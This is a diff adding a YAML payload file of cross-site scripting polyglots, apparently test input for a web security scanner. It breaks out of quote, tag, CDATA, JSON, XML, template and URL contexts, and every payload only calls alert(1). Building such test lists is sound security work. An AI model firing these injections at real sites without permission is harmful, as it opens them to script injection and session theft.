@@ -1,0 +1,128 @@
+name: "XSS Polyglot Payloads"
+description: "Multi-context XSS payloads that work in various injection points"
+attack_type: "xss"
+category: "polyglot"
+
+payloads:
+  # Classic polyglots
+  - value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+    description: "Comprehensive polyglot"
+    tags: ["polyglot", "comprehensive"]
+
+  - value: "'\"><img src=x onerror=alert(1)>"
+    description: "Quote break with img"
+    tags: ["polyglot", "quote-break", "img"]
+
+  - value: "'\"><svg onload=alert(1)>"
+    description: "Quote break with svg"
+    tags: ["polyglot", "quote-break", "svg"]
+
+  - value: "'\"><script>alert(1)</script>"
+    description: "Quote break with script"
+    tags: ["polyglot", "quote-break", "script"]
+
+  - value: "</script><script>alert(1)</script>"
+    description: "Script tag break"
+    tags: ["polyglot", "script-break"]
+
+  - value: "--><script>alert(1)</script>"
+    description: "Comment break"
+    tags: ["polyglot", "comment-break"]
+
+  - value: "]]><script>alert(1)</script>"
+    description: "CDATA break"
+    tags: ["polyglot", "cdata-break"]
+
+  - value: "\";alert(1);//"
+    description: "JS string break"
+    tags: ["polyglot", "js-string"]
+
+  - value: "';alert(1);//"
+    description: "JS single quote break"
+    tags: ["polyglot", "js-string"]
+
+  - value: "</title><script>alert(1)</script>"
+    description: "Title tag break"
+    tags: ["polyglot", "title-break"]
+
+  - value: "</textarea><script>alert(1)</script>"
+    description: "Textarea break"
+    tags: ["polyglot", "textarea-break"]
+
+  - value: "</style><script>alert(1)</script>"
+    description: "Style tag break"
+    tags: ["polyglot", "style-break"]
+
+  # Advanced polyglots
+  - value: "'-alert(1)-'"
+    description: "Math context injection"
+    tags: ["polyglot", "math-context"]
+
+  - value: "\\'-alert(1)//"
+    description: "Escaped quote bypass"
+    tags: ["polyglot", "escape-bypass"]
+
+  - value: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+    description: "Ultimate polyglot"
+    tags: ["polyglot", "ultimate"]
+
+  - value: "\"onmouseover=alert(1) x=\""
+    description: "Attribute injection"
+    tags: ["polyglot", "attribute"]
+
+  - value: "' onmouseover=alert(1) '"
+    description: "Single quote attribute"
+    tags: ["polyglot", "attribute"]
+
+  - value: "\">'><script>alert(1)</script>"
+    description: "Multi-quote break"
+    tags: ["polyglot", "multi-quote"]
+
+  - value: "\"'><img src=x onerror=alert(1)>"
+    description: "Multi-quote img"
+    tags: ["polyglot", "multi-quote", "img"]
+
+  # Encoding-aware polyglots
+  - value: "%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
+    description: "URL encoded polyglot"
+    tags: ["polyglot", "url-encoded"]
+
+  - value: "&#34;&#62;&#60;script&#62;alert(1)&#60;/script&#62;"
+    description: "HTML entity polyglot"
+    tags: ["polyglot", "html-entity"]
+
+  # JSON context polyglots
+  - value: "\"},\"x\":\"<script>alert(1)</script>"
+    description: "JSON break to HTML"
+    tags: ["polyglot", "json"]
+
+  - value: "\"},{\"x\":\"<img src=x onerror=alert(1)>"
+    description: "JSON array break"
+    tags: ["polyglot", "json"]
+
+  # XML context polyglots
+  - value: "]]><!--><script>alert(1)</script>"
+    description: "XML CDATA and comment"
+    tags: ["polyglot", "xml"]
+
+  - value: "--><svg onload=alert(1)>"
+    description: "XML comment break"
+    tags: ["polyglot", "xml"]
+
+  # Template context
+  - value: "{{constructor.constructor('alert(1)')()}}"
+    description: "Template sandbox escape"
+    tags: ["polyglot", "template"]
+
+  - value: "${alert(1)}"
+    description: "Template literal"
+    tags: ["polyglot", "template-literal"]
+
+  # URL context
+  - value: "javascript:alert(1)//"
+    description: "URL javascript"
+    tags: ["polyglot", "url"]
+
+  - value: "data:text/html,<script>alert(1)</script>"
+    description: "Data URL"
+    tags: ["polyglot", "data-url"]
